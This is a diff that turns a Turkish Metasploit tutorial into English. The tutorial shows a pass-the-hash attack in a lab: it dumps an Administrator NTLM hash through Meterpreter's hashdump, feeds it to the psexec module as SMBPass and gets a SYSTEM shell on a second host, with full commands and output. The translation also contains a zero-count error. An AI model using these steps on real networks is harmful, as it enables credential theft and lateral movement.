@@ -6,8 +6,8 @@ linkTitle: PSexec Pass the Hash
 translationKey: MSF_PSexec_Pass_the_Hash
 date: 2017-05-25T13:17:00+03:00
 author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
-description: psexec modülü, bulduğunuz hash değerini parola olarak kullanmanıza olanak sağlar.
-url: /tr/msf-pseexec-pass-the-hash/
+description: We will use the psexec module to pass the hash value to the target system.
+url: /msf-psexec-pass-the-hash/
 featured_image: /images/metasploit.jpg
 categories:
    - Metasploit Framework
@@ -15,28 +15,28 @@ tags:
    - cybersecurity
    - metasploit framework
 ---
-psexec modülü, genellikle pentest işlemleri esnasında kullanılır. Bu modül sayesine hedef sisteme giriş yapmanız mümkün hale gelmektedir. Alışılmış kullanımda, sistemin kullanıcı adı ve parolasını elde ettiğiniz ve bunu exploit modülüne değişken olarak girmeniz yeterlidir.
+The psexec module is usually used during pentest operations. Thanks to this module, it becomes possible to log in to the target system. In normal use, it is enough to obtain the username and password of the system and enter them as a variable in the exploit module.
 
-Normalde izlenen yol, sistemde meterpreter shell açıldığında `fgdump`, `pwdump` veya `cachedump` komutlarıyla parola elde etmektir. Bu aramalar esnasında bulduğunuz `hash` değerleri olursa, bunları çeşitli araçlar kullanarak çözmeye ve parolaların açık halini elde etmeye çalışırız.
+Normally, the path followed is to obtain the password with the `fgdump`, `pwdump` or `cachedump` commands when the meterpreter shell is opened on the system. If you find `hash` values ​​​​during these searches, we try to solve them using various tools and obtain the open form of the passwords.
 
-Oysa bazen başka bir durumla karşı karşı kalabilirsiniz. Bir sistemde `Administrator` yetkili bir oturum açtınız ve kullanıcının `hash` olarak formatlı parolasını elde ettiniz. Bu oturum açtığınız sistem üzerinden aynı ağda bulunan başka bir sisteme bağlanmak istediğinizde, `Administrator` kullanıcısının parolasını çözmenize gerek olmayabilir. Genellikle ağdaki cihazlar bu `hash` değerleri kulanarak haberleşirler. psexec modülü, bulduğunuz `hash` değerini parola olarak kullanmanıza olanak sağlar.
+However, sometimes you may encounter a different situation. You have opened an `Administrator` authorized session on a system and obtained the user's password formatted as `hash`. When you want to connect to another system on the same network through this system you logged in, you may not need to solve the password of the `Administrator` user. Usually, devices on the network communicate using these `hash` values. The psexec module allows you to use the `hash` value you find as a password.
 
-UYARI-1:
+WARNING-1:
 
-NTLM kullanan sistemde, bulacağınız `hash` değeri `******NOPASSWORD*******:8846f7eaee8fb117ad06bdd830b7586c` formatındaysa, baş taraftaki `******NOPASSWORD*******` kısmını 32 adet sıfır ile değiştirerek `psexec` içine değişken olarak girmeniz gerekir. Yani değer, `00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c` şeklinde olmalıdır.
+In a system using NTLM, if the `hash` value you will find is in the format `******NOPASSWORD*******:8846f7eaee8fb117ad06bdd830b7586c`, you need to replace the `******NOPASSWORD*******` part at the beginning with 32 zeros and enter it as a variable in `psexec`. In other words, the value should be in the form `00000000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c`.
 
-UYARI-2:
+WARNING-2:
 
-Lab ortamında, doğru hash değeri girdiğiniz halde `STATUS_ACCESS_DENIED (Command=117 WordCount=0)` hatası alıyorsanız, hedef Windows sisteminin Registry ayarlarında `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters` içerisinde `RequireSecuritySignature` değerini `0` olarak ayarlamalısınız.
+In a lab environment, if you receive the `STATUS_ACCESS_DENIED (Command=117 WordCount=0)` error even though you entered the correct hash value, you should set the `RequireSecuritySignature` value to `0` in the Registry settings of the target Windows system in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters`.
 
 ## Hashdump
 
-Aşağıda, bir exploit kullanılarak Meterpreter oturumu açılmıştır ve `post/windows/gather/hashdump` modülü ile sistemde hash değerleri bulunmak istenmektedir.
+Below, a Meterpreter session has been opened using an exploit and the `post/windows/gather/hashdump` module is used to find hash values ​​in the system.
 
 ```bash
 > Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.131:1042)
 
-meterpreter > run post/windows/gather/hashdump 
+meterpreter > run post/windows/gather/hashdump
 
 > Obtaining the boot key...
 > Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
@@ -48,13 +48,13 @@ Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b75
 meterpreter >
 ```
 
-Görüldüğü gibi, `RHOST: 192.168.57.131` IP adresinde bulunan Administrator kullanıcısına ait `e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c` değeri elde edilmiştir.
+As you can see, the `e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c` value belonging to the Administrator user at the IP address `RHOST: 192.168.57.131` has been obtained.
 
-Şimdi bu hash değerini kullanarak `RHOST: 192.168.57.140` IP adresine oturum açmayı deneyelim. Tabii ki önceden yaptığınız taramada aynı ağda `192.168.57.140` IP adresinde ve `445` portunda `SMB` servisinin çalıştığını keşfettiğinizi kabul ediyoruz.
+Now let's try to log in to the IP address `RHOST: 192.168.57.140` using this hash value. Of course, we assume that you discovered that the `SMB` service is running on the same network at the IP address `192.168.57.140` and port `445` in your previous scan.
 
 ## psexec
 
-Önce `msfconsole` ile Metasploit Framework başlatalım ve `psexec` modülünü yükleyelim.
+First, let's start Metasploit Framework with `msfconsole` and load the `psexec` module.
 
 ```bash
 root@kali:~# msfconsole
@@ -122,7 +122,7 @@ Exploit target:
 
 ## SMBPass
 
-Yukarıda görüldüğü gibi `exploit/windows/smb/psexec` modülünde `SMBPass` değişkenini girmemiz gerekmektedir. `SMBPass` değişkenine elimizde bulunan hash değerini girelim ve modülü `exploit` komutuyla çalıştıralım.
+As seen above, we need to enter the `SMBPass` variable in the `exploit/windows/smb/psexec` module. Let's enter the hash value we have in the `SMBPass` variable and run the module with the `exploit` command.
 
 ```bash
 msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
@@ -141,7 +141,7 @@ msf exploit(psexec) > exploit
 > Closing service handle...
 > Opening service...
 > Starting the service...
-> Removing the service...
+>Removing the service...
 > Closing service handle...
 > Deleting \KoVCxCjx.exe...
 > Sending stage (719360 bytes)
@@ -156,4 +156,4 @@ Microsoft Windows [Version 5.2.3790]
 C:\WINDOWS\system32>
 ```
 
-Gördüğünüz gibi `192.168.57.140` IP adresinde oturum açılmıştır.
+As you can see, a session has been opened at the IP address `192.168.57.140`.
